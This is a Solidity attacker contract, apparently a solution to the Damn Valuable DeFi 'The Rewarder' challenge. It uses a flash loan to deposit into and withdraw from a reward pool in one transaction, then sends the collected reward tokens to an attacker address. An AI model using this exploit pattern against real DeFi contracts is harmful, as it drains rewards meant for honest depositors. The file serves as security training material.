// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./RewardToken.sol";
interface IFlashLoanerPool{
    function flashLoan(uint256 amount) external;
}

interface ITheRewarderPool{
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
    function distributeRewards() external returns (uint256);
    function isNewRewardsRound() external view returns (bool);
}

contract Attacker{

    IFlashLoanerPool flashPool;
    ITheRewarderPool rewardPool;
    DamnValuableToken liquidityToken;
    RewardToken rewardToken;
    address attacker;


    constructor(address _flash,address _reward, address _token,address _rewardToken,address _attacker){
        flashPool = IFlashLoanerPool(_flash);
        rewardPool = ITheRewarderPool(_reward);
        liquidityToken = DamnValuableToken(_token);
        rewardToken = RewardToken(_rewardToken);
        attacker = _attacker;
    }

    function attack(uint amount) public{
        flashPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) public{
        liquidityToken.approve(address(rewardPool), amount);
        rewardPool.deposit(amount);
        rewardPool.withdraw(amount);
        liquidityToken.transfer(address(flashPool), amount);
        uint reward = rewardToken.balanceOf(address(this));
        rewardToken.transfer(attacker, reward);
    }
}